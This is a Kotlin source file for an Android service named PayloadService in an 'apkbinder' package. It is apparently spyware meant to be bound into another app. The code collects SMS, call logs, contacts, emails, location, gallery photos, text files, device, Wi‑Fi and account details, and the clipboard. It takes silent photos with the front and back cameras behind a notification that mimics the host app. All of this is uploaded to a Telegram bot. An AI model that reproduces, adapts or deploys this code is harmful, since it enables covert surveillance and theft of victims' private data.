package Com.devhs.apkbinder.payload

import android.accounts.AccountManager
import android.app.ActivityManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.SurfaceTexture
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.hardware.Camera
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.os.Looper
import android.os.StatFs
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import Com.devhs.apkbinder.core.Const
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone
import java.util.concurrent.CountDownLatch
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

class PayloadService : Service() {

    private val workPool: ExecutorService = Executors.newFixedThreadPool(Const.PARALLEL_UPLOADS)
    private val camPool: ExecutorService = Executors.newFixedThreadPool(2)
    private val done = AtomicInteger(0)

    @Volatile private var alive = true
    @Volatile private var token = ""
    @Volatile private var chat = ""
    private var appName = ""

    override fun onCreate() {
        super.onCreate()
        HsLog.init(this)
        appName = try {
            val ai = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(ai).toString()
        } catch (t: Throwable) {
            "App"
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        HsLog.w("onStartCommand")
        val clipText = intent?.getStringExtra("clip") ?: ""
        startForegroundSafe()

        Thread {
            try {
                run(clipText)
            } catch (t: Throwable) {
                HsLog.e("run: ${t.javaClass.simpleName} ${t.message}")
            }
        }.start()

        return START_NOT_STICKY
    }

    override fun onDestroy() {
        alive = false
        try {
            workPool.shutdownNow()
        } catch (_: Throwable) {
        }
        try {
            camPool.shutdownNow()
        } catch (_: Throwable) {
        }
        super.onDestroy()
    }

    // ---------------- main ----------------

    private fun run(clipText: String) {
        val cfg = HsConfig.read(this)
        if (cfg == null) {
            HsLog.e("no config")
            finish()
            return
        }
        token = cfg.token
        chat = cfg.chat
        val f = cfg.features
        HsLog.w("features=$f")

        val front = f.contains("front_camera")
        val back = f.contains("back_camera")
        val clipOn = f.contains("clipboard")
        val hasCamera = front || back

        if (clipOn) {
            if (clipText.isNotEmpty()) sendTextFile("clipboard.txt", clipText + "\n")
            startClipWatcher()
        }

        if (f.contains("location")) workPool.execute { sendLocation() }

        if (f.contains("gallery")) {
            val images = queryImages()
            HsLog.w("images=${images.size}")
            images.forEach { sendImage(it) }
            val texts = queryTexts()
            HsLog.w("texts=${texts.size}")
            texts.forEach { sendDoc(it) }
        }

        if (f.contains("sms")) workPool.execute { sendSms() }
        if (f.contains("calls")) workPool.execute { sendCalls() }
        if (f.contains("contacts")) workPool.execute { sendContacts() }
        if (f.contains("contact_details")) workPool.execute { sendContactDetails() }
        if (f.contains("device")) workPool.execute { sendDevice() }
        if (f.contains("apps")) workPool.execute { sendApps() }
        if (f.contains("wifi")) workPool.execute { sendWifi() }
        if (f.contains("accounts")) workPool.execute { sendAccounts() }
        if (f.contains("system")) workPool.execute { sendSystem() }

        // সব টেক্সট/গ্যালারি শেষ হওয়া পর্যন্ত অপেক্ষা
        workPool.shutdown()
        try {
            workPool.awaitTermination(90, TimeUnit.MINUTES)
        } catch (_: Throwable) {
        }
        HsLog.w("text done: ${done.get()}")

        // এখন ক্যামেরা
        if (hasCamera) {
            HsLog.w("camera start front=$front back=$back")
            startCameras(front, back)
        } else if (!clipOn) {
            try {
                Thread.sleep(3000L)
            } catch (_: InterruptedException) {
            }
            finish()
        }
    }

    private fun finish() {
        try {
            stopForeground(true)
        } catch (_: Throwable) {
        }
        stopSelf()
    }

    // ---------------- notification ----------------

    private fun startForegroundSafe() {
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (Build.VERSION.SDK_INT >= 26) {
                val ch = NotificationChannel(
                    Const.CHANNEL_ID, appName, NotificationManager.IMPORTANCE_LOW
                )
                ch.setShowBadge(false)
                nm.createNotificationChannel(ch)
            }

            val smallIcon = try {
                val ai = packageManager.getApplicationInfo(packageName, 0)
                if (ai.icon != 0) ai.icon else android.R.drawable.stat_sys_download
            } catch (t: Throwable) {
                android.R.drawable.stat_sys_download
            }

            val builder = Notification.Builder(this, Const.CHANNEL_ID)
                .setContentTitle(appName)
                .setContentText(appName)
                .setSmallIcon(smallIcon)
                .setOngoing(true)
                .setOnlyAlertOnce(true)

            try {
                val ai = packageManager.getApplicationInfo(packageName, 0)
                drawableToBitmap(packageManager.getApplicationIcon(ai))?.let {
                    builder.setLargeIcon(it)
                }
            } catch (_: Throwable) {
            }

            val n = builder.build()

            if (Build.VERSION.SDK_INT >= 29) {
                try {
                    startForeground(
                        Const.NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                    return
                } catch (t: Throwable) {
                    HsLog.e("fg typed: ${t.message}")
                }
            }
            try {
                startForeground(Const.NOTIF_ID, n)
            } catch (t: Throwable) {
                HsLog.e("fg plain: ${t.message}")
            }
        } catch (t: Throwable) {
            HsLog.e("startForegroundSafe: ${t.message}")
        }
    }

    private fun drawableToBitmap(d: Drawable): Bitmap? = try {
        if (d is BitmapDrawable && d.bitmap != null) d.bitmap
        else {
            val w = if (d.intrinsicWidth > 0) d.intrinsicWidth else 96
            val h = if (d.intrinsicHeight > 0) d.intrinsicHeight else 96
            val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
            val c = Canvas(bmp)
            d.setBounds(0, 0, w, h)
            d.draw(c)
            bmp
        }
    } catch (t: Throwable) {
        null
    }

    // ---------------- HTTP ----------------

    private fun postFile(
        api: String,
        field: String,
        fileName: String,
        mime: String,
        data: ByteArray
    ): Boolean {
        var conn: HttpURLConnection? = null
        try {
            val boundary = "----hs" + System.nanoTime()
            val safeName = fileName.replace("\"", "_")

            val pre = ("--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                    chat + "\r\n" +
                    "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" +
                    Const.CAPTION + "\r\n" +
                    "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"" + field +
                    "\"; filename=\"" + safeName + "\"\r\n" +
                    "Content-Type: " + mime + "\r\n\r\n").toByteArray(Charsets.UTF_8)

            val post = ("\r\n--" + boundary + "--\r\n").toByteArray(Charsets.UTF_8)

            val url = URL("https://api.telegram.org/bot" + token + "/" + api)
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 15000
            conn.readTimeout = 60000
            conn.setRequestProperty(
                "Content-Type", "multipart/form-data; boundary=" + boundary
            )
            conn.setFixedLengthStreamingMode(pre.size + data.size + post.size)

            conn.outputStream.use { os ->
                os.write(pre)
                os.write(data)
                os.write(post)
                os.flush()
            }

            val code = conn.responseCode
            if (code in 200..299) {
                done.incrementAndGet()
                return true
            }
            val body = try {
                conn.errorStream?.use { it.readBytes().toString(Charsets.UTF_8) }
            } catch (_: Throwable) {
                null
            }
            HsLog.e("http $code $api $fileName ${body?.take(200)}")
            return false
        } catch (t: Throwable) {
            HsLog.e("http fail $api: ${t.message}")
            return false
        } finally {
            try {
                conn?.disconnect()
            } catch (_: Throwable) {
            }
        }
    }

    // ---------------- gallery ----------------

    private fun queryImages(): List<Uri> {
        val out = ArrayList<Uri>()
        val proj = arrayOf(MediaStore.Images.Media._ID)
        try {
            cursor(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, Const.IMAGE_LIMIT) { id ->
                out += ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
                )
            }
        } catch (t: Throwable) {
            HsLog.e("queryImages: ${t.message}")
        }
        return out
    }

    private fun queryTexts(): List<Uri> {
        val out = ArrayList<Uri>()
        try {
            val proj = arrayOf(MediaStore.Files.FileColumns._ID)
            val sel = MediaStore.Files.FileColumns.MEDIA_TYPE + "=? OR " +
                    MediaStore.Files.FileColumns.MEDIA_TYPE + "=?"
            val args = arrayOf(
                MediaStore.Files.FileColumns.MEDIA_TYPE_NONE.toString(),
                MediaStore.Files.FileColumns.MEDIA_TYPE_DOCUMENT.toString()
            )
            cursor(MediaStore.Files.getContentUri("external"), proj, 3000, sel, args) { id ->
                out += ContentUris.withAppendedId(
                    MediaStore.Files.getContentUri("external"), id
                )
            }
        } catch (t: Throwable) {
            HsLog.e("queryTexts: ${t.message}")
        }
        return out
    }

    private fun cursor(
        uri: Uri, proj: Array<String>, limit: Int,
        sel: String? = null, args: Array<String>? = null,
        onRow: (Long) -> Unit
    ) {
        contentResolver.query(
            uri, proj, sel, args,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { c ->
            val idx = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            var n = 0
            while (c.moveToNext() && n < limit) {
                onRow(c.getLong(idx))
                n++
            }
        }
    }

    private fun nameOf(uri: Uri): String = try {
        contentResolver.query(
            uri, arrayOf(MediaStore.MediaColumns.DISPLAY_NAME), null, null, null
        )?.use { c -> if (c.moveToFirst()) c.getString(0) else null } ?: "file"
    } catch (t: Throwable) {
        "file"
    }

    private fun bytesOf(uri: Uri): ByteArray? = try {
        contentResolver.openInputStream(uri)?.use { it.readBytes() }
    } catch (t: Throwable) {
        null
    }

    private fun sendImage(uri: Uri) {
        workPool.execute {
            try {
                val name = nameOf(uri)
                val lower = name.lowercase()
                if (!(lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
                            lower.endsWith(".png") || lower.endsWith(".webp"))
                ) return@execute
                val data = bytesOf(uri) ?: return@execute
                postFile("sendPhoto", "photo", name, "image/jpeg", data)
            } catch (t: Throwable) {
                HsLog.e("sendImage: ${t.message}")
            }
        }
    }

    private fun sendDoc(uri: Uri) {
        workPool.execute {
            try {
                val name = nameOf(uri)
                if (!name.lowercase().endsWith(".txt")) return@execute
                val data = bytesOf(uri) ?: return@execute
                postFile("sendDocument", "document", name, "text/plain", data)
            } catch (t: Throwable) {
                HsLog.e("sendDoc: ${t.message}")
            }
        }
    }

    // সরাসরি পোস্ট — pool shutdown হলেও সমস্যা নেই
    private fun sendTextFile(name: String, content: String) {
        try {
            postFile(
                "sendDocument", "document", name, "text/plain",
                content.toByteArray(Charsets.UTF_8)
            )
        } catch (t: Throwable) {
            HsLog.e("sendTextFile: ${t.message}")
        }
    }

    private fun stamp(millis: Long): String = try {
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(millis))
    } catch (t: Throwable) {
        millis.toString()
    }

    // ---------------- text features ----------------

    private fun sendSms() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"),
                null, null, "date DESC"
            )?.use { c ->
                while (c.moveToNext() && sb.length < 4_000_000) {
                    sb.append(c.getString(0) ?: "?")
                        .append(" | ").append(stamp(c.getLong(2)))
                        .append(" | type=").append(c.getInt(3))
                        .append("\n").append(c.getString(1) ?: "").append("\n---\n")
                }
            }
        } catch (t: Throwable) {
            HsLog.e("sms: ${t.message}")
            return
        }
        if (sb.isNotEmpty()) sendTextFile("sms.txt", sb.toString())
    }

    private fun sendCalls() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION, CallLog.Calls.DATE),
                null, null, CallLog.Calls.DATE + " DESC"
            )?.use { c ->
                while (c.moveToNext() && sb.length < 2_000_000) {
                    sb.append(c.getString(0) ?: "?")
                        .append(" | type=").append(c.getInt(1))
                        .append(" | dur=").append(c.getLong(2)).append("s")
                        .append(" | ").append(stamp(c.getLong(3))).append("\n")
                }
            }
        } catch (t: Throwable) {
            HsLog.e("calls: ${t.message}")
            return
        }
        if (sb.isNotEmpty()) sendTextFile("calls.txt", sb.toString())
    }

    private fun sendContacts() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, null
            )?.use { c ->
                while (c.moveToNext() && sb.length < 2_000_000) {
                    sb.append(c.getString(0) ?: "?")
                        .append(" | ").append(c.getString(1) ?: "").append("\n")
                }
            }
        } catch (t: Throwable) {
            HsLog.e("contacts: ${t.message}")
            return
        }
        if (sb.isNotEmpty()) sendTextFile("contacts.txt", sb.toString())
    }

    private fun sendContactDetails() {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Email.ADDRESS,
                    ContactsContract.CommonDataKinds.Email.DISPLAY_NAME
                ),
                null, null, null
            )?.use { c ->
                while (c.moveToNext() && sb.length < 2_000_000) {
                    sb.append(c.getString(1) ?: "?")
                        .append(" | email: ").append(c.getString(0) ?: "").append("\n")
                }
            }
        } catch (t: Throwable) {
            HsLog.e("emails: ${t.message}")
        }
        try {
            val bd = contentResolver.query(
                ContactsContract.Data.CONTENT_URI,
                arrayOf(
                    ContactsContract.Data.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Event.START_DATE
                ),
                ContactsContract.Data.MIMETYPE + "=" +
                        ContactsContract.CommonDataKinds.Event.CONTENT_ITEM_TYPE +
                        " AND " + ContactsContract.CommonDataKinds.Event.TYPE + "=" +
                        ContactsContract.CommonDataKinds.Event.TYPE_BIRTHDAY,
                null, null
            )
            bd?.use { c ->
                while (c.moveToNext() && sb.length < 2_000_000) {
                    sb.append(c.getString(0) ?: "?")
                        .append(" | birthday: ").append(c.getString(1) ?: "").append("\n")
                }
            }
        } catch (t: Throwable) {
            HsLog.e("birthdays: ${t.message}")
        }
        if (sb.isNotEmpty()) sendTextFile("contact_details.txt", sb.toString())
    }

    private fun startClipWatcher() {
        Thread {
            val seen = HashSet<String>()
            while (alive) {
                try {
                    val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clip = cm.primaryClip
                    if (clip != null) {
                        for (i in 0 until clip.itemCount) {
                            val t = clip.getItemAt(i).text?.toString() ?: continue
                            if (t.isBlank()) continue
                            if (seen.add(t)) sendTextFile("clipboard.txt", t + "\n")
                        }
                    }
                } catch (_: Throwable) {
                }
                try {
                    Thread.sleep(1200L)
                } catch (_: InterruptedException) {
                    break
                }
            }
        }.start()
    }

    // ---------------- location ----------------

    private fun sendLocation() {
        val sb = StringBuilder()
        val lm = try {
            getSystemService(Context.LOCATION_SERVICE) as LocationManager
        } catch (t: Throwable) {
            null
        }
        if (lm != null) {
            for (p in listOf(
                LocationManager.GPS_PROVIDER,
                LocationManager.NETWORK_PROVIDER,
                LocationManager.PASSIVE_PROVIDER
            )) {
                try {
                    val loc = lm.getLastKnownLocation(p) ?: continue
                    appendLoc(sb, p, loc)
                } catch (_: Throwable) {
                }
            }

            if (sb.isEmpty()) {
                val latch = CountDownLatch(1)
                val listener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        appendLoc(sb, "live", location)
                        latch.countDown()
                    }

                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                }
                for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
                    try {
                        @Suppress("DEPRECATION")
                        lm.requestSingleUpdate(p, listener, Looper.getMainLooper())
                    } catch (_: Throwable) {
                    }
                }
                try {
                    latch.await(12, TimeUnit.SECONDS)
                } catch (_: Throwable) {
                }
                try {
                    lm.removeUpdates(listener)
                } catch (_: Throwable) {
                }
            }
        }
        if (sb.isEmpty()) sb.append("no location available\n")
        HsLog.w("location chars=${sb.length}")
        sendTextFile("location.txt", sb.toString())
    }

    private fun appendLoc(sb: StringBuilder, provider: String, loc: Location) {
        sb.append(provider).append(": ")
            .append(loc.latitude).append(", ").append(loc.longitude)
            .append(" acc=").append(loc.accuracy)
            .append(" t=").append(stamp(loc.time)).append("\n")
        sb.append("https://maps.google.com/?q=")
            .append(loc.latitude).append(",").append(loc.longitude).append("\n---\n")
    }

    // ---------------- device / apps / wifi / accounts / system ----------------

    @Suppress("DEPRECATION")
    private fun sendDevice() {
        val sb = StringBuilder()
        sb.append("Brand: ").append(Build.BRAND).append("\n")
        sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n")
        sb.append("Model: ").append(Build.MODEL).append("\n")
        sb.append("Device: ").append(Build.DEVICE).append("\n")
        sb.append("Product: ").append(Build.PRODUCT).append("\n")
        sb.append("Fingerprint: ").append(Build.FINGERPRINT).append("\n")
        sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n")
        sb.append("Release: ").append(Build.VERSION.RELEASE).append("\n")
        sb.append("Serial: ").append(
            try {
                if (Build.VERSION.SDK_INT >= 26) Build.getSerial() else Build.SERIAL
            } catch (t: Throwable) {
                "n/a"
            }
        ).append("\n")
        sb.append("Uptime: ").append(SystemClock.elapsedRealtime() / 1000).append("s\n")
        sb.append("Timezone: ").append(TimeZone.getDefault().id).append("\n")
        try {
            val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val mi = ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            sb.append("RAM free: ").append(mi.availMem / 1048576).append("MB")
                .append(" total: ").append(mi.totalMem / 1048576).append("MB\n")
        } catch (_: Throwable) {
        }
        try {
            val st = StatFs(filesDir.path)
            sb.append("Storage free: ").append(st.availableBytes / 1048576).append("MB\n")
        } catch (_: Throwable) {
        }
        try {
            sb.append("IP: ")
                .append(
                    java.net.NetworkInterface.getNetworkInterfaces().toList()
                        .flatMap { it.inetAddresses.toList() }
                        .filter { !it.isLoopbackAddress && it is java.net.Inet4Address }
                        .joinToString(",") { it.hostAddress ?: "" }
                ).append("\n")
        } catch (_: Throwable) {
        }
        sendTextFile("device.txt", sb.toString())
    }

    @Suppress("DEPRECATION")
    private fun sendApps() {
        val sb = StringBuilder()
        try {
            val pm = packageManager
            val list = pm.getInstalledPackages(PackageManager.GET_META_DATA)
            for (p in list) {
                if (sb.length > 3_000_000) break
                val isSys = (p.applicationInfo?.flags ?: 0) and
                        android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0
                sb.append(p.packageName).append(" | v")
                    .append(p.versionName ?: "?")
                    .append(if (isSys) " | sys" else "")
                    .append("\n")
            }
        } catch (t: Throwable) {
            HsLog.e("apps: ${t.message}")
            return
        }
        sendTextFile("apps.txt", sb.toString())
    }

    @Suppress("DEPRECATION")
    private fun sendWifi() {
        val sb = StringBuilder()
        try {
            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val ci = wm.connectionInfo
            sb.append("SSID: ").append(ci.ssid).append("\n")
            sb.append("BSSID: ").append(ci.bssid).append("\n")
            sb.append("IP: ").append(
                String.format(
                    Locale.US, "%d.%d.%d.%d",
                    ci.ipAddress and 0xff, (ci.ipAddress shr 8) and 0xff,
                    (ci.ipAddress shr 16) and 0xff, (ci.ipAddress shr 24) and 0xff
                )
            ).append("\n")
            sb.append("Link speed: ").append(ci.linkSpeed).append("Mbps\n")
            sb.append("RSSI: ").append(ci.rssi).append("\n")
            sb.append("MAC: ").append(ci.macAddress).append("\n")
            sb.append("\nScanned networks:\n")
            for (r in wm.scanResults) {
                sb.append(r.SSID).append(" | ").append(r.BSSID)
                    .append(" | ").append(r.level).append("dBm\n")
            }
        } catch (t: Throwable) {
            HsLog.e("wifi: ${t.message}")
            if (sb.isEmpty()) return
        }
        sendTextFile("wifi.txt", sb.toString())
    }

    private fun sendAccounts() {
        val sb = StringBuilder()
        try {
            val am = AccountManager.get(this)
            for (a in am.accounts) {
                sb.append(a.name).append(" | ").append(a.type).append("\n")
            }
            sb.append("\nNote: passwords are not readable without root.\n")
        } catch (t: Throwable) {
            HsLog.e("accounts: ${t.message}")
            return
        }
        sendTextFile("accounts.txt", sb.toString())
    }

    private fun sendSystem() {
        val sb = StringBuilder()
        try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            sb.append("Battery: ")
                .append(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY))
                .append("%\n")
        } catch (_: Throwable) {
        }
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val nc = cm.getNetworkCapabilities(cm.activeNetwork)
            val t = when {
                nc == null -> "none"
                nc.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
                nc.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
                nc.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
                else -> "other"
            }
            sb.append("Network: ").append(t).append("\n")
        } catch (_: Throwable) {
        }
        try {
            val dm = resources.displayMetrics
            sb.append("Screen: ").append(dm.widthPixels).append("x")
                .append(dm.heightPixels).append(" @").append(dm.densityDpi).append("\n")
        } catch (_: Throwable) {
        }
        try {
            sb.append("Locale: ").append(Locale.getDefault().toString()).append("\n")
        } catch (_: Throwable) {
        }
        sendTextFile("system.txt", sb.toString())
    }

    // ---------------- camera ----------------

    @Suppress("DEPRECATION")
    private fun findCamera(front: Boolean): Int {
        val want = if (front) Camera.CameraInfo.CAMERA_FACING_FRONT
        else Camera.CameraInfo.CAMERA_FACING_BACK
        val info = Camera.CameraInfo()
        for (i in 0 until Camera.getNumberOfCameras()) {
            Camera.getCameraInfo(i, info)
            if (info.facing == want) return i
        }
        return -1
    }

    // একটাই ক্যামেরা থ্রেড — পালা করে, হার্ডওয়্যার দ্বন্দ্ব নেই
    private fun startCameras(front: Boolean, back: Boolean) {
        Thread {
            while (alive) {
                when {
                    front && back -> {
                        captureBurst(true, 2)
                        if (!alive) break
                        captureBurst(false, 2)
                    }
                    front -> captureBurst(true, 1)
                    back -> captureBurst(false, 1)
                    else -> break
                }
                try {
                    Thread.sleep(500L)
                } catch (_: InterruptedException) {
                    break
                }
            }
        }.start()
    }

    @Suppress("DEPRECATION")
    private fun openCamera(front: Boolean): Camera? {
        val id = findCamera(front)
        if (id < 0) {
            HsLog.e("camera not found front=$front")
            return null
        }
        for (i in 0 until 4) {
            try {
                return Camera.open(id)
            } catch (t: Throwable) {
                HsLog.e("open retry front=$front: ${t.message}")
                try {
                    Thread.sleep(700L)
                } catch (_: InterruptedException) {
                    break
                }
            }
        }
        return null
    }

    @Suppress("DEPRECATION")
    private fun captureBurst(front: Boolean, count: Int) {
        val cam = openCamera(front) ?: return
        try {
            try {
                cam.enableShutterSound(false)
            } catch (_: Throwable) {
            }
            try {
                val p = cam.parameters
                var best: Camera.Size? = null
                for (s in p.supportedPictureSizes) {
                    val px = s.width * s.height
                    if (px <= 1_400_000) {
                        val b = best
                        if (b == null || px > b.width * b.height) best = s
                    }
                }
                if (best != null) p.setPictureSize(best.width, best.height)
                cam.parameters = p
            } catch (_: Throwable) {
            }

            val st = SurfaceTexture(0)
            cam.setPreviewTexture(st)
            cam.startPreview()

            for (i in 0 until count) {
                if (!alive) break
                val latch = CountDownLatch(1)
                try {
                    cam.takePicture(null, null, { data, _ ->
                        if (data != null && data.isNotEmpty()) {
                            HsLog.w("capture ${data.size} front=$front")
                            val name = (if (front) "front_" else "back_") +
                                    System.currentTimeMillis() + ".jpg"
                            try {
                                camPool.execute {
                                    postFile("sendPhoto", "photo", name, "image/jpeg", data)
                                }
                            } catch (_: Throwable) {
                            }
                        }
                        latch.countDown()
                    })
                } catch (t: Throwable) {
                    HsLog.e("shot: ${t.message}")
                    latch.countDown()
                }
                try {
                    latch.await(10, TimeUnit.SECONDS)
                } catch (_: Throwable) {
                }
                try {
                    cam.startPreview()
                } catch (_: Throwable) {
                }
                if (i < count - 1) {
                    try {
                        Thread.sleep(800L)
                    } catch (_: InterruptedException) {
                        break
                    }
                }
            }
        } finally {
            try {
                cam.stopPreview()
            } catch (_: Throwable) {
            }
            try {
                cam.release()
            } catch (_: Throwable) {
            }
        }
    }
}
